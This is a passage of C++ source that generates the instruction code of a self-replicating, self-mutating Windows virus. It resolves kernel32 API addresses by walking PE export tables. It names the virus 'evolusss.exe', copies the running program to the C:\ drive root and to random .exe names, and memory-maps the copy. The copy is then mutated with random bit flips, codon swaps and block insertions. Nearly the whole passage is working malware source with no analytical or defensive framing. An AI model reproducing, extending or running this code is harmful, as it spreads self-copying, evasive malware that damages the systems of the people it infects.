file << ""                               _push"" << endl; CreateAnIntron();

zer0(0);
addnumber(""0xFF"");
file << ""                               _save                ; BC2=0xFF"" << endl; CreateAnIntron();
file << ""                               _pop                 ; BC1=???n"" << endl; CreateAnIntron();
file << ""                               _and                 ; BC1=000n"" << endl; CreateAnIntron();

file << ""                               _JnzUp"" << endl; CreateAnIntron();

GetAddress(""APITmpBuffer"");
file << ""                               _saveWrtOff"" << endl; CreateAnIntron();
file << ""                               _nopsA"" << endl; CreateAnIntron();
file << ""                               _writeDWord          ; mov dword[APITmpBuffer], RegA"" << endl; CreateAnIntron();

file << ""                       _popall"" << endl; CreateAnIntron();

GetAddress(""APITmpBuffer"");
file << ""                       _getdata"" << endl; CreateAnIntron();
file << ""                       _nopdB              ; save MagicNumber of this API"" << endl; CreateAnIntron();


zer0(0);
addnumber(""0x0FFF"");
file << ""                       _save                ; save 0x0FFF in BC2"" << endl; CreateAnIntron();

file << ""                       _nopsB"" << endl; CreateAnIntron();
file << ""                       _and                 ; BC1=dword[MagicNumberOfThisAPI] && 0x0FFF"" << endl; CreateAnIntron();
file << ""                       _nopdB"" << endl; CreateAnIntron();

file << ""                       _nopsD               ; Get Pointer to API MagicWord"" << endl; CreateAnIntron();
file << ""                       _getdata"" << endl; CreateAnIntron();
file << ""                       _and                 ; BC1=dword[MagicNumberSearchAPI] && 0x0FFF"" << endl; CreateAnIntron();
file << ""                       _save                ; save"" << endl; CreateAnIntron();

file << ""                       _nopsB               ; Get MagicNumber of current API again"" << endl; CreateAnIntron();
file << ""                       _xor                 ; (dword[MagicNumberSearchAPI] && 0x0FFF) XOR dword[MagicNumberOfThisAPI] && 0x0FFF"" << endl; CreateAnIntron();
file << ""                                            ; If zero, assume that we found API"" << endl; CreateAnIntron();
file << ""                   _JnzUp"" << endl; CreateAnIntron();


zer0(0);
addnumber(""1"");
file << ""                       _save                ; BC2=1"" << endl; CreateAnIntron();

file << ""                       _pop                 ; Get Counter from Stack"" << endl; CreateAnIntron();
file << ""                       _shl                 ; BC1=counter*2 (because Ordinal Table has just 2byte Entries)"" << endl; CreateAnIntron();
file << ""                                               ; (=no DLLs with more than 65535 functions?!)"" << endl; CreateAnIntron();
file << ""                       _save"" << endl; CreateAnIntron();

GetAddress(""hOrdinalTable"");
file << ""                       _getdata"" << endl; CreateAnIntron();
file << ""                       _addsaved            ; Points to ordinal number of the API"" << endl; CreateAnIntron();

file << ""                       _push"" << endl; CreateAnIntron();
zer0(0);
addnumber(""0xFFFF"");
file << ""                       _save"" << endl; CreateAnIntron();
file << ""                       _pop                 ; BC2=0xFFFF"" << endl; CreateAnIntron();

file << ""                       _getdata             ; BC1=Ordinal Number of API"" << endl; CreateAnIntron();
file << ""                                               ; Ordinal Number is a word, so we have to set the high word to zero"" << endl; CreateAnIntron();
file << ""                       _and                 ; BC1=dword[Ordinal] && 0xFFFF"" << endl; CreateAnIntron();

file << ""                       _push"" << endl; CreateAnIntron();
zer0(0);
addnumber(""2"");
file << ""                       _save"" << endl; CreateAnIntron();
file << ""                       _pop"" << endl; CreateAnIntron();
file << ""                       _shl                 ; BC1=Ordinal*4, as Addresse to Function is a dword"" << endl; CreateAnIntron();

file << ""                       _save"" << endl; CreateAnIntron();

GetAddress(""hAddressTable"");
file << ""                       _getdata"" << endl; CreateAnIntron();

file << ""                       _addsaved            ; BC1 points to Addresse of API Function"" << endl; CreateAnIntron();
file << ""                       _getdata             ; BC1=Addresse of API Function"" << endl; CreateAnIntron();
file << ""                       _save"" << endl; CreateAnIntron();

GetAddress(""hDLLlibrary32"");
file << ""                       _getdata"" << endl; CreateAnIntron();
file << ""                       _addsaved            ; relative -> absolut"" << endl; CreateAnIntron();
file << ""                                               ; BC1 contains the Addresse of the API in (kernel32) memory"" << endl; CreateAnIntron();


file << ""                       _nopdB              ; save the Addresse in RegB"" << endl; CreateAnIntron();
GetAddress(""hAddressePointer"");
file << ""                       _getdata             ; Pointer to the buffer where we save the API addresse"" << endl; CreateAnIntron();
file << ""                       _saveWrtOff          ; We will write to this Addresse"" << endl; CreateAnIntron();

file << ""                       _nopsB               ; restore API Addresse"" << endl; CreateAnIntron();

file << ""                       _writeDWord          ; Save the API Function Addresse in the Function Buffer!!!"" << endl; CreateAnIntron();


file << ""               _popall"" << endl; CreateAnIntron();

GetAddress(""hAddressePointer"");
file << ""               _saveWrtOff      ; The buffer where we save the pointer"" << endl; CreateAnIntron();

file << ""               _nopsA"" << endl; CreateAnIntron();
addnumber(""0x4"");

file << ""               _writeDWord      ; save pointer"" << endl; CreateAnIntron();
file << ""               _nopdA           ; save different (prevents a more messy code)"" << endl; CreateAnIntron();

file << ""               _nopsD           ; Next Magic Number for API"" << endl; CreateAnIntron();
addnumber(""0x4"");
file << ""               _nopdD"" << endl; CreateAnIntron();

file << ""               _nopsB"" << endl; CreateAnIntron();
addnumber(""0x1"");
file << ""               _nopdB"" << endl; CreateAnIntron();
file << ""               _save"" << endl; CreateAnIntron();

GetAddress(""APINumber"");
file << ""               _getdata"" << endl; CreateAnIntron();


subsaved(0);
file << ""               _JnzUp           ; Jnz FindAllAPIsNext"" << endl; CreateAnIntron();

file << ""           ; end FindAllAPIsNext"" << endl; CreateAnIntron();

file << ""       _popall"" << endl; CreateAnIntron();
file << ""       ; FoundAPI"" << endl; CreateAnIntron();

file << ""; end FindAllAPIs in kernel32.dll"" << endl; CreateAnIntron();

GetAddress(""stDLLadvapi32"");
file << ""       _push"" << endl; CreateAnIntron();
file << ""       _CallAPILoadLibrary      ; invoke LoadLibrary, "" << static_cast<char>(34) << ""kernel32.dll"" << static_cast<char>(34) << """" << endl; CreateAnIntron();


GetAddress(""hDLLlibrary32"");
file << ""       _saveWrtOff"" << endl; CreateAnIntron();


file << ""       _nopsA"" << endl; CreateAnIntron();
file << ""       _writeDWord              ; mov dword[hDLLkernel32], eax"" << endl; CreateAnIntron();

file << ""       _save                    ; Save kernel32.dll position"" << endl; CreateAnIntron();

addnumber(""0x3C"");
file << ""       _getdata                 ; mov RegB, dword[hDLLkernel32+0x3C]"" << endl; CreateAnIntron();

file << ""                                   ; = Pointer to PE Header of kernel32.dll"" << endl; CreateAnIntron();
file << ""       _addsaved                ; relative -> absolut"" << endl; CreateAnIntron();

addnumber(""0x78"");
file << ""       _getdata                 ; Export Tables"" << endl; CreateAnIntron();
file << ""       _addsaved                ; relative -> absolut"" << endl; CreateAnIntron();
addnumber(""0x1C"");

file << ""       _nopdA                   ; temporarily save Offset of Addresse Table in RegA"" << endl; CreateAnIntron();

GetAddress(""hAddressTable"");
file << ""       _saveWrtOff              ; WriteOffset=hAddressTable"" << endl; CreateAnIntron();

file << ""       _nopsA                   ; restore RegA=Addresse Tables"" << endl; CreateAnIntron();
file << ""       _getdata                 ; Pointer To Addresse Table"" << endl; CreateAnIntron();
file << ""       _addsaved                ; relative -> absolut"" << endl; CreateAnIntron();
file << ""       _writeDWord              ; mov dword[hAddressTable], (Pointer to Addresse Table)"" << endl; CreateAnIntron();

GetAddress(""hNamePointerTable"");
file << ""       _saveWrtOff              ; WriteOffset=hNamePointerTable"" << endl; CreateAnIntron();

file << ""       _nopsA                   ; BC1=Addresse Table"" << endl; CreateAnIntron();
addnumber(""4"");
file << ""       _nopdA"" << endl; CreateAnIntron();

file << ""       _getdata                 ; Pointer To Name Table"" << endl; CreateAnIntron();
file << ""       _addsaved                ; relative -> absolut"" << endl; CreateAnIntron();
file << ""       _writeDWord              ; mov dword[hNamePointerTable], (Pointer to Name Pointer Table)"" << endl; CreateAnIntron();

GetAddress(""hOrdinalTable"");
file << ""       _saveWrtOff              ; WriteOffset=hOrdinalTable"" << endl; CreateAnIntron();

file << ""       _nopsA"" << endl; CreateAnIntron();
addnumber(""4"");

file << ""       _getdata                 ; Ordinal Table"" << endl; CreateAnIntron();
file << ""       _addsaved                ; relative -> absolut"" << endl; CreateAnIntron();
file << ""       _writeDWord              ; mov dword[hOrdinalTable], (Pointer to Ordinal Table)"" << endl; CreateAnIntron();


GetAddress(""APINumber"");
file << ""       _saveWrtOff"" << endl; CreateAnIntron();
zer0(0);
addnumber(""APINumberAdvapi"");
file << ""       _writeDWord              ; Save number of kernel32.dll APIs"" << endl; CreateAnIntron();

GetAddress(""hAddressePointer"");
file << ""       _saveWrtOff"" << endl; CreateAnIntron();
GetAddress(""APIAddressesReg"");
file << ""       _writeDWord      ; Saves the AddressePointer"" << endl; CreateAnIntron();


GetAddress(""hMagicNumberPointer"");
file << ""       _saveWrtOff"" << endl; CreateAnIntron();
GetAddress(""APIMagicNumbersReg"");
file << ""       _writeDWord      ; Saves the MagicNumber Pointer"" << endl; CreateAnIntron();


zer0(0);
addnumber(""42"");
file << ""       _save"" << endl; CreateAnIntron();
file << ""       _pop"" << endl; CreateAnIntron();
file << ""       _sub0001"" << endl; CreateAnIntron();
file << ""       _push"" << endl; CreateAnIntron();
addnumber(""1"");
file << ""       _xor"" << endl; CreateAnIntron();
file << ""       _JnzUp"" << endl; CreateAnIntron();

file << ""       _pop                    ; Remove trash from stack"" << endl; CreateAnIntron();


zer0(0);
addnumber(""0x8007"");
file << ""       _push"" << endl; CreateAnIntron();
CallAPI(""hSetErrorMode"");

CallAPI(""hGetTickCount"");


file << ""; ############################################################################"" << endl; CreateAnIntron();
file << ""; ############################################################################"" << endl; CreateAnIntron();
file << ""; ############################################################################"" << endl; CreateAnIntron();
file << ""; #####"" << endl; CreateAnIntron();
file << ""; #####   First child ..."" << endl; CreateAnIntron();
file << ""; #####"" << endl; CreateAnIntron();


GetAddress(""RandomNumber"");
file << ""       _saveWrtOff"" << endl; CreateAnIntron();
file << ""       _nopsA"" << endl; CreateAnIntron();
file << ""       _writeDWord              ; mov dword[RandomNumber], RegA"" << endl; CreateAnIntron();

zer0(0);
file << ""       _nopdB                  ; mov RegB, 0"" << endl; CreateAnIntron();


file << "";   RndNameLoop:"" << endl; CreateAnIntron();
file << ""       _getEIP"" << endl; CreateAnIntron();
file << ""       _sub0001"" << endl; CreateAnIntron();
file << ""       _sub0001"" << endl; CreateAnIntron();
file << ""       _sub0001"" << endl; CreateAnIntron();
file << ""       _sub0001"" << endl; CreateAnIntron();
file << ""       _sub0001"" << endl; CreateAnIntron();
file << ""       _saveJmpOff              ; mov esi, eip"" << endl; CreateAnIntron();

GetAddress(""RandomNumber"");

file << ""       _getdata"" << endl; CreateAnIntron();
file << ""       _nopdA                   ; mov eax, [RandomNumber]"" << endl; CreateAnIntron();


zer0(0);
file << ""       _nopdD                   ; mov edx, 0"" << endl; CreateAnIntron();

addnumber(""26"");

file << ""       _div                     ; div ebx"" << endl; CreateAnIntron();

file << ""       _nopsD"" << endl; CreateAnIntron();
addnumber(""97"");
file << ""       _nopdD                   ; add edx, 97"" << endl; CreateAnIntron();

file << ""       _nopsB      ; ebx=ebp=count"" << endl; CreateAnIntron();
file << ""       _save       ; ebp=ebx=ecx=count"" << endl; CreateAnIntron();

GetAddress(""RandomFileName"");
file << ""                      ; ebx=rfn, ebp=ecx=count"" << endl; CreateAnIntron();
file << ""       _addsaved   ; ebx=rfn+count, ebp=ecx=count"" << endl; CreateAnIntron();
file << ""       _saveWrtOff ; edi=rfn+count, ebx=rfn+count, ebp=ecx=count"" << endl; CreateAnIntron();


file << ""       _nopsD"" << endl; CreateAnIntron();
file << ""       _writeByte               ; mov byte[ecx+RandomFileName], dl"" << endl; CreateAnIntron();

CalcNewRandNumberAndSaveIt();

file << ""       _nopsB"" << endl; CreateAnIntron();
addnumber(""1"");
file << ""       _nopdB"" << endl; CreateAnIntron();
file << ""       _save                    ; inc counter"" << endl; CreateAnIntron();

zer0(1);
addnumber(""8"");
subsaved(0);


file << ""       _JnzUp                   ; jnz esi"" << endl; CreateAnIntron();
file << ""; loop RndNameLoop"" << endl; CreateAnIntron();

GetAddress(""rndext"");
file << ""       _saveWrtOff"" << endl; CreateAnIntron();
zer0(0);
addnumber(""\'.exe\'"");
file << ""       _writeDWord              ; create extention"" << endl; CreateAnIntron();

CallAPI(""hGetCommandLineA"");
zer0(0);
addnumber(""0xFF"");
file << ""       _save"" << endl; CreateAnIntron();

file << ""       _nopsA"" << endl; CreateAnIntron();
file << ""       _getdata"" << endl; CreateAnIntron();
file << ""       _and"" << endl; CreateAnIntron();

file << ""       _nopdB           ; RegB=1st byte of filename"" << endl; CreateAnIntron();
zer0(0);
addnumber(""34"");
file << ""       _nopdD           ; RegD=34"" << endl; CreateAnIntron();


file << ""       _nopsB"" << endl; CreateAnIntron();
file << ""       _save"" << endl; CreateAnIntron();
file << ""       _nopsD"" << endl; CreateAnIntron();
subsaved(0);

file << ""       _JnzDown"" << endl; 
file << ""           _nopsA"" << endl; 
file << ""           _add0001"" << endl; 
file << ""           _nopdA"" << endl;
file << ""           _nopREAL"" << endl;

file << ""       _nopsA"" << endl; CreateAnIntron();
file << ""       _push               ; Save RegA at stack"" << endl; CreateAnIntron();

file << ""; FindEndOfString:"" << endl; CreateAnIntron();
file << ""       _getEIP"" << endl; CreateAnIntron();
file << ""       _sub0001"" << endl; CreateAnIntron();
file << ""       _sub0001"" << endl; CreateAnIntron();
file << ""       _sub0001"" << endl; CreateAnIntron();
file << ""       _sub0001"" << endl; CreateAnIntron();
file << ""       _sub0001"" << endl; CreateAnIntron();
file << ""       _saveJmpOff         ; mov esi, eip"" << endl; CreateAnIntron();

file << ""       _nopsA"" << endl; CreateAnIntron();
addnumber(""1"");
file << ""       _nopdA"" << endl; CreateAnIntron();

zer0(0);
addnumber(""0xFF"");
file << ""       _save"" << endl; CreateAnIntron();
file << ""       _nopsA"" << endl; CreateAnIntron();
file << ""       _getdata"" << endl; CreateAnIntron();
file << ""       _and"" << endl; CreateAnIntron();
file << ""       _nopdD               ; RegD=(dword[Name+count]&& 0xFF)"" << endl; CreateAnIntron();

zer0(0);
addnumber(""34"");
file << ""       _save"" << endl; CreateAnIntron();
file << ""       _nopsB               ; 1st Byte of filename"" << endl; CreateAnIntron();
subsaved(1);

file << ""       _JnzDown"" << endl;
file << ""           _nopsD"" << endl;
file << ""           _xor"" << endl;
file << ""           _JnzUp"" << endl;
file << ""           _nopREAL"" << endl; 
file << ""; EndFindEndOfString:"" << endl; CreateAnIntron();

file << ""       _nopsA"" << endl; CreateAnIntron();
file << ""       _saveWrtOff"" << endl; CreateAnIntron();

zer0(1);
addnumber(""34"");
file << ""       _nopsB               ; 1st Byte of filename"" << endl; CreateAnIntron();
subsaved(0);
file << ""       _JnzDown"" << endl; 
file << ""           _save"" << endl; 
file << ""           _xor"" << endl;
file << ""           _writeByte"" << endl;
file << ""           _nopREAL"" << endl;

file << ""       _pop"" << endl; CreateAnIntron();
file << ""       _nopdA"" << endl; CreateAnIntron();


GetAddress(""Driveletter3-1"");
file << ""       _saveWrtOff"" << endl; CreateAnIntron();
zer0(0);
addnumber(""0x5C3A4300"");
file << ""       _writeDWord"" << endl; CreateAnIntron();

GetAddress(""virusname"");
file << ""       _saveWrtOff"" << endl; CreateAnIntron();
zer0(0);
addnumber(""\'evol\'"");
file << ""       _writeDWord"" << endl; CreateAnIntron();

GetAddress(""virusname+4"");
file << ""       _saveWrtOff"" << endl; CreateAnIntron();
zer0(0);
addnumber(""\'usss\'"");
file << ""       _writeDWord                  ; Construct virusfilename"" << endl; CreateAnIntron();

GetAddress(""virext"");
file << ""       _saveWrtOff"" << endl; CreateAnIntron();
zer0(0);
addnumber(""\'.exe\'"");
file << ""       _writeDWord                  ; create extention"" << endl; CreateAnIntron();

file << ""       _nopsA"" << endl; CreateAnIntron();
file << ""       _push                       ; Save pointer to filename buffer"" << endl; CreateAnIntron();
zer0(0);
file << ""       _push"" << endl; CreateAnIntron();
GetAddress(""Driveletter3"");
file << ""       _push"" << endl; CreateAnIntron();
file << ""       _nopsA"" << endl; CreateAnIntron();
file << ""       _push"" << endl; CreateAnIntron();
CallAPI(""hCopyFileA"");

file << ""       _pop"" << endl; CreateAnIntron();
file << ""       _nopdA"" << endl; CreateAnIntron();
zer0(0);
file << ""       _push"" << endl; CreateAnIntron();
GetAddress(""RandomFileName"");
file << ""       _push"" << endl; CreateAnIntron();
file << ""       _nopsA"" << endl; CreateAnIntron();
file << ""       _push"" << endl; CreateAnIntron();
CallAPI(""hCopyFileA"");

zer0(0);
file << ""       _push"" << endl; CreateAnIntron();
file << ""       _push"" << endl; CreateAnIntron();
addnumber(""3"");
file << ""       _push"" << endl; CreateAnIntron();
zer0(0);
file << ""       _push"" << endl; CreateAnIntron();
addnumber(""1"");
file << ""       _push"" << endl; CreateAnIntron();
file << ""       _sub0001"" << endl; CreateAnIntron();
addnumber(""0xC0000000"");
file << ""       _push"" << endl; CreateAnIntron();
GetAddress(""RandomFileName"");
file << ""       _push"" << endl; CreateAnIntron();
CallAPI(""hCreateFileA"");


GetAddress(""FileHandle"");
file << ""       _saveWrtOff"" << endl; CreateAnIntron();
file << ""       _nopsA"" << endl; CreateAnIntron();
file << ""       _writeDWord              ; mov dword[FileHandle], RegA"" << endl; CreateAnIntron();

file << ""       _save"" << endl; CreateAnIntron();

GetAddress(""FileSize"");

file << ""       _push"" << endl; CreateAnIntron();
zer0(1);
file << ""       _addsaved"" << endl; CreateAnIntron();
file << ""       _push"" << endl; CreateAnIntron();
CallAPI(""hGetFileSize"");

GetAddress(""FileSize"");
file << ""       _saveWrtOff"" << endl; CreateAnIntron();
file << ""       _nopsA"" << endl; CreateAnIntron();
file << ""       _writeDWord              ; mov dword[FileSize], RegA"" << endl; CreateAnIntron();

zer0(1);
file << ""       _push"" << endl; CreateAnIntron();
file << ""       _addsaved"" << endl; CreateAnIntron();
file << ""       _push"" << endl; CreateAnIntron();
zer0(0);
file << ""       _push"" << endl; CreateAnIntron();
addnumber(""4"");
file << ""       _push"" << endl; CreateAnIntron();
zer0(0);
file << ""       _push"" << endl; CreateAnIntron();
GetAddress(""FileHandle"");
file << ""       _getdata"" << endl; CreateAnIntron();
file << ""       _push"" << endl; CreateAnIntron();
CallAPI(""hCreateFileMappingA"");

GetAddress(""MapHandle"");

file << ""       _saveWrtOff"" << endl; CreateAnIntron();
file << ""       _nopsA"" << endl; CreateAnIntron();
file << ""       _writeDWord               ; mov dword[MapHandle], RegA"" << endl; CreateAnIntron();

file << ""       _save"" << endl; CreateAnIntron();
GetAddress(""FileSize"");

file << ""       _getdata"" << endl; CreateAnIntron();
file << ""       _push   ; [FileSize]"" << endl; CreateAnIntron();
zer0(1);
file << ""       _push   ; 0"" << endl; CreateAnIntron();
file << ""       _push   ; 0"" << endl; CreateAnIntron();
addnumber(""2"");
file << ""       _push"" << endl; CreateAnIntron();
zer0(1);
file << ""       _addsaved"" << endl; CreateAnIntron();
file << ""       _push   ; MapHandle"" << endl; CreateAnIntron();

CallAPI(""hMapViewOfFile"");

GetAddress(""MapPointer"");

file << ""       _saveWrtOff"" << endl; CreateAnIntron();
file << ""       _nopsA"" << endl; CreateAnIntron();
file << ""       _writeDWord              ; mov dword[MapPointer], RegA"" << endl; CreateAnIntron();

file << ""       _nopsA"" << endl; CreateAnIntron();
file << ""       _nopdB                  ; mov RegB, RegA+AminoStartInMap"" << endl; CreateAnIntron();




file << ""; ############################################################################"" << endl; CreateAnIntron();
file << ""; ############################################################################"" << endl; CreateAnIntron();
file << ""; #####"" << endl; CreateAnIntron();
file << ""; #####  Here the mutation happens: Bitmutation, exchange of codons, ..."" << endl; CreateAnIntron();
file << ""; #####"" << endl; CreateAnIntron();

file << "";ANextByteInChain:"" << endl; CreateAnIntron();
file << ""       _getEIP"" << endl; CreateAnIntron();
file << ""       _sub0001"" << endl; CreateAnIntron();
file << ""       _sub0001"" << endl; CreateAnIntron();
file << ""       _sub0001"" << endl; CreateAnIntron();
file << ""       _sub0001"" << endl; CreateAnIntron();
file << ""       _sub0001"" << endl; CreateAnIntron();
file << ""       _saveJmpOff              ; mov BA2, eip"" << endl; CreateAnIntron();

file << ""       _nopsB"" << endl; CreateAnIntron();
file << ""       _push                    ; push counter"" << endl; CreateAnIntron();


file << ""; ############################################################################"" << endl; CreateAnIntron();
file << ""; ##### Start Bit-Flip Mutation (Point-Mutation)"" << endl; CreateAnIntron();

zer0(0);
addnumber(""12"");
file << ""       _save"" << endl; CreateAnIntron();

GetAddress(""RandomNumber"");

file << ""       _getdata"" << endl; CreateAnIntron();
file << ""       _shr"" << endl; CreateAnIntron();
file << ""       _push"" << endl; CreateAnIntron();

zer0(0);
addnumber(""7"");
file << ""       _save"" << endl; CreateAnIntron();

file << ""       _pop"" << endl; CreateAnIntron();
file << ""       _and                     ; BC1=[RandomNumber shr 12] && 0111b"" << endl; CreateAnIntron();
file << ""       _save"" << endl; CreateAnIntron();

zer0(1);
addnumber(""1"");
file << ""       _shl                     ; shl BC1, BC2"" << endl; CreateAnIntron();
file << ""       _save"" << endl; CreateAnIntron();

file << ""       _pop"" << endl; CreateAnIntron();
file << ""       _push"" << endl; CreateAnIntron();
file << ""       _saveWrtOff              ; BA1=[MapPointer]+counter"" << endl; CreateAnIntron();

file << ""       _getdata                 ; mov BC1, dword[BC1]"" << endl; CreateAnIntron();
file << ""       _xor                     ; xor BC1, BC2"" << endl; CreateAnIntron();
file << ""       _nopdB                   ; save changed byte"" << endl; CreateAnIntron();


zer0(0);
addnumber(""7"");
file << ""       _save"" << endl; CreateAnIntron();

GetAddress(""RandomNumber"");

file << ""       _getdata"" << endl; CreateAnIntron();
file << ""       _nopdA"" << endl; CreateAnIntron();

zer0(1);
file << ""       _nopdD"" << endl; CreateAnIntron();

addnumber(""VarThreshold1"");

file << ""       _div"" << endl; CreateAnIntron();
file << ""       _nopsD"" << endl; CreateAnIntron();
subsaved(0);
file << ""       _JnzDown"" << endl;
file << ""               _nopsB                   ; restore"" << endl;
file << ""               _writeByte               ; save mutation!"" << endl; 
file << ""               _nopREAL"" << endl;
file << ""               _nopREAL"" << endl;


file << ""; ##### Finished Bit-Flip Mutation (Point-Mutation)"" << endl; CreateAnIntron();
file << ""; ############################################################################"" << endl; CreateAnIntron();


CalcNewRandNumberAndSaveIt();


file << ""; ############################################################################"" << endl; CreateAnIntron();
file << ""; ##### Start codons exchange"" << endl; CreateAnIntron();


GetAddress(""xchgBuffer"");
file << ""       _saveWrtOff"" << endl; CreateAnIntron();

file << ""       _pop"" << endl; CreateAnIntron();
file << ""       _push                        ; get counter"" << endl; CreateAnIntron();

file << ""       _getdata"" << endl; CreateAnIntron();
file << ""       _writeDWord                  ; xchgBuffer=dword[counter]"" << endl; CreateAnIntron();

file << ""       _pop"" << endl; CreateAnIntron();
file << ""       _push                        ; get counter"" << endl; CreateAnIntron();
file << ""       _saveWrtOff                  ; save destination for potential writing"" << endl; CreateAnIntron();

addnumber(""4"");
file << ""       _getdata"" << endl; CreateAnIntron();
file << ""       _nopdB                       ; RegB=dword[counter+4]"" << endl; CreateAnIntron();


zer0(0);
addnumber(""7"");
file << ""       _save"" << endl; CreateAnIntron();
GetAddress(""RandomNumber"");

file << ""       _getdata"" << endl; CreateAnIntron();
file << ""       _nopdA"" << endl; CreateAnIntron();

zer0(1);
file << ""       _nopdD"" << endl; CreateAnIntron();

addnumber(""xchgThreshold1"");

file << ""       _div"" << endl; CreateAnIntron();
file << ""       _nopsD"" << endl; CreateAnIntron();
subsaved(0);

file << ""       _JnzDown                 ; if not zero, dont exchange codons"" << endl; 
file << ""           _nopsB                   ; restore"" << endl;
file << ""           _writeDWord              ; save mutation!"" << endl;
file << ""           _nopREAL"" << endl;
file << ""           _nopREAL"" << endl;

GetAddress(""xchgBuffer"");
file << ""       _getdata"" << endl; CreateAnIntron();

file << ""       _nopdB"" << endl; CreateAnIntron();

file << ""       _pop"" << endl; CreateAnIntron();
file << ""       _push                    ; get counter"" << endl; CreateAnIntron();
addnumber(""4"");
file << ""       _saveWrtOff"" << endl; CreateAnIntron();


zer0(0);
addnumber(""7"");
file << ""       _save"" << endl; CreateAnIntron();
GetAddress(""RandomNumber"");

file << ""       _getdata"" << endl; CreateAnIntron();
file << ""       _nopdA"" << endl; CreateAnIntron();

zer0(1);
file << ""       _nopdD"" << endl; CreateAnIntron();

addnumber(""xchgThreshold1"");

file << ""       _div"" << endl; CreateAnIntron();
file << ""       _nopsD"" << endl; CreateAnIntron();
subsaved(0);

file << ""       _JnzDown                 ; if not zero, dont exchange codons"" << endl;
file << ""           _nopsB                   ; restore"" << endl;
file << ""           _writeDWord              ; save mutation!"" << endl;
file << ""           _nopREAL"" << endl;
file << ""           _nopREAL"" << endl;



CalcNewRandNumberAndSaveIt();


file << ""       _pop"" << endl; CreateAnIntron();
addnumber(""1"");
file << ""       _nopdB                   ; inc counter"" << endl; CreateAnIntron();

GetAddress(""MapPointer"");
file << ""       _getdata"" << endl; CreateAnIntron();
file << ""       _save"" << endl; CreateAnIntron();
zer0(1);

GetAddress(""FileSize"");
file << ""       _getdata"" << endl; CreateAnIntron();

file << ""       _sub0001"" << endl; CreateAnIntron();
file << ""       _sub0001"" << endl; CreateAnIntron();
file << ""       _sub0001"" << endl; CreateAnIntron();
file << ""       _sub0001"" << endl; CreateAnIntron();
file << ""       _sub0001"" << endl; CreateAnIntron();
file << ""       _sub0001"" << endl; CreateAnIntron();
file << ""       _sub0001"" << endl; CreateAnIntron();
file << ""       _sub0001"" << endl; CreateAnIntron();
file << ""       _sub0001     ; Dont mutate the last 9 bytes because of xchg problems"" << endl; CreateAnIntron();

file << ""       _addsaved"" << endl; CreateAnIntron();
file << ""       _save                    ; mov save, [MapPointer]+GenomEndInMap"" << endl; CreateAnIntron();

file << ""       _nopsB"" << endl; CreateAnIntron();
subsaved(0);
file << ""       _JnzUp                   ; jnz esi"" << endl; CreateAnIntron();
file << ""; loop ANextByteInChain"" << endl; CreateAnIntron();

file << ""; ##### Finished codons exchange"" << endl; CreateAnIntron();
file << ""; ############################################################################"" << endl; CreateAnIntron();

GetAddress(""RandomNumber"");

file << ""       _getdata"" << endl; CreateAnIntron();
file << ""       _nopdA"" << endl; CreateAnIntron();
zer0(0);
file << ""       _nopdD"" << endl; CreateAnIntron();

addnumber(""InsertThreshold1"");

file << ""       _div"" << endl; CreateAnIntron();
file << ""       _nopsD"" << endl; CreateAnIntron();

file << ""       _push                ; Save Result = (rand() % InsertThreshold1)"" << endl; CreateAnIntron();

CalcNewRandNumberAndSaveIt();





GetAddress(""RandomNumber"");
file << ""       _getdata"" << endl; CreateAnIntron();
file << ""       _nopdA                               ; mov RegA, [RandomNumber]"" << endl; CreateAnIntron();

zer0(0);
file << ""       _nopdD                               ; mov RegD, 0"" << endl; CreateAnIntron();

GetAddress(""FileSize"");
file << ""       _getdata"" << endl; CreateAnIntron();
file << ""       _nopdB                               ; RegB=FileSize"" << endl; CreateAnIntron();

file << ""       _div                                 ; div BC1 <- RegD = rand() % FileSize = nBeforeIns"" << endl; CreateAnIntron();

GetAddress(""InsStart"");
file << ""       _saveWrtOff"" << endl; CreateAnIntron();

file << ""       _nopsD                               ; BC1=nBeforeIns"" << endl; CreateAnIntron();
file << ""       _save                                ; BC2=nBeforeIns"" << endl; CreateAnIntron();

file << ""       _nopsB                               ; BC1=FileSize"" << endl; CreateAnIntron();
subsaved(1);
file << ""       _nopdB                               ; RegB=(FileSize-nBeforeIns)"" << endl; CreateAnIntron();

GetAddress(""MapPointer"");
file << ""       _getdata                             ; BC1=MapPoint"" << endl; CreateAnIntron();
file << ""       _addsaved                            ; BC1=MapPoint + nBeforeIns = InsStart"" << endl; CreateAnIntron();

file << ""       _writeDWord                          ; !!! InsStart=MapPoint + nBeforeIns"" << endl; CreateAnIntron();
file << ""       _push"" << endl; CreateAnIntron();



CalcNewRandNumberAndSaveIt();

GetAddress(""nBlockSize"");
file << ""       _saveWrtOff"" << endl; CreateAnIntron();

GetAddress(""RandomNumber"");
file << ""       _getdata"" << endl; CreateAnIntron();
file << ""       _nopdA                               ; mov RegA, [RandomNumber]"" << endl; CreateAnIntron();

zer0(0);
file << ""       _nopdD                               ; mov RegD, 0"" << endl; CreateAnIntron();
addnumber(""32"");

file << ""       _div                                 ; div BC1 <- RegD = rand() % 32 = nBlockSize"" << endl; CreateAnIntron();



file << ""       _nopsD                               ; BC1=nBlockSize"" << endl; CreateAnIntron();
addnumber(""1"");
file << ""       _writeDWord                          ; !!! nBlockSize"" << endl; CreateAnIntron();

file << ""       _save                                ; BC2=nBlockSize"" << endl; CreateAnIntron();

GetAddress(""InsEnd"");
file << ""       _saveWrtOff"" << endl; CreateAnIntron();

file << ""       _pop                                 ; BC1 = InsStart"" << endl; CreateAnIntron();
file << ""       _addsaved                            ; BC1 = InsStart + nBlockSize = InsEnd"" << endl; CreateAnIntron();

file << ""       _writeDWord                          ; !!! InsEnd"" << endl; CreateAnIntron();



CalcNewRandNumberAndSaveIt();

GetAddress(""nByteBlockToMov"");
file << ""       _saveWrtOff"" << endl; CreateAnIntron();

GetAddress(""RandomNumber"");
file << ""       _getdata"" << endl; CreateAnIntron();
file << ""       _nopdA                               ; mov RegA, [RandomNumber]"" << endl; CreateAnIntron();

zer0(0);
file << ""       _nopdD                               ; mov RegD, 0"" << endl; CreateAnIntron();

file << ""       _nopsB                               ; BC1=(FileSize-nBeforeIns)"" << endl; CreateAnIntron();

file << ""       _div"" << endl; CreateAnIntron();

file << ""       _nopsD                               ; BC1=nByteBlockToMov"" << endl; CreateAnIntron();
addnumber(""1"");
file << ""       _writeDWord                          ; !!! nByteBlockToMov"" << endl; CreateAnIntron();

GetAddress(""InsStart"");
file << ""       _getdata"" << endl; CreateAnIntron();
file << ""       _nopdA               ; RegA=InsStart"" << endl; CreateAnIntron();

GetAddress(""InsEnd"");
file << ""       _getdata"" << endl; CreateAnIntron();
file << ""       _nopdB               ; RegB=InsEnd"" << endl; CreateAnIntron();

